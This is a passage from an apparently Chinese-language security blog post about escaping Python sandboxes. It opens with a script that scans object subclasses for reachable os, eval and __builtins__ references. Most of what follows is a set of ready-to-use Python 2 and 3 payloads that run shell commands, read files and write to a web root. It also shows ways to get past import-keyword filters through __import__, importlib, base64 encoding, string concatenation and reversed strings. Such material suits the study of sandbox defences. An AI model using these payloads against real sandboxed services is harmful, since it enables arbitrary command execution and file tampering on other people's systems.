class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'configparser'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copyreg'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'crypt'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'datetime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'enum'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fractions'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ftplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imp'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'ipaddress'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lzma'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'operator'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'pathlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pickle'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickletools'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plistlib'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'queue'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'re'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'reprlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'secrets'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'selectors'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'signal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'socketserver'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre_compile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statistics'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tracemalloc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tty'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'typing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'weakref'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'zipapp'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(list(find_modules.keys()) + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><p> python2<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure></p>
<p>python3<br>python3各个小版本之间有区别，有的payload可以用于py3.7 有的可以用于py3.5  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure>
<h1 id="import限制与绕过"><a href="#import限制与绕过" class="headerlink" title="import限制与绕过"></a>import限制与绕过</h1><p>import 导入<br><img src="../../images/python/sandbox/1.png" alt=""><br>所以说如果导入的模块a中有着另一个模块b，那么，我们可以用a.b的方法或者<code>a.__dict__[b&lt;name&gt;]</code>的方法间接访问模块b    </p>
<p><strong>例子1</strong>     </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,sys</span><br><span class="line">pattern  = re.compile(<span class="string">'import\s+(os|subprocess)'</span>)</span><br><span class="line">match = re.search(pattern,sys.args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>要执行shell命令,必须引入 os/commands/subprocess这几个包,<br>对于攻击者来说,改如何绕过呢,   </p>
<p><strong>必须使用其他的引入方式</strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__函数 #动态加载类和函数</span><br><span class="line">importlib库</span><br></pre></td></tr></table></figure>
<p><code>__import__</code>函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test = __import__(<span class="string">"os"</span>)</span><br><span class="line"><span class="keyword">print</span> test.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
<p>importlib库</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test= importlib.import_module(<span class="string">"os"</span>)</span><br><span class="line">print(test.system(<span class="string">"whoami"</span>))</span><br></pre></td></tr></table></figure>
<p>还可以<strong>使用编码的方式</strong>绕过对导入包关键字的检查，比如使用base64，python2中适用  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">"os"</span>)</span><br><span class="line"><span class="string">'b3M='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = __import__(base64.b64decode(<span class="string">'b3M='</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag.system(<span class="string">'whoami'</span>)</span><br><span class="line">misaki\user</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = importlib.import_module(<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag.system(<span class="string">'whoami'</span>)</span><br><span class="line">misaki\user</span><br></pre></td></tr></table></figure>
<p><strong>或者使用字符串拼接的方式</strong>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'who'</span>+<span class="string">'ami'</span>)</span><br></pre></td></tr></table></figure>
<p>字符串f翻转截取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __import__(<span class="string">'so'</span>[::-1]).system(<span class="string">'whoami'</span>)</span><br><span class="line">misaki\user</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exec</span>(<span class="string">')"imaohw"(metsys.so ;so tropmi'</span>[::-1])</span><br><span class="line">misaki\user</span><br></pre></td></tr></table></figure>



<p><strong>例子2</strong>   </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re,sys</span><br><span class="line">pattern  = re.compile(<span class="string">'import'</span>)</span><br><span class="line">match = re.search(pattern,sys.args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile</p>
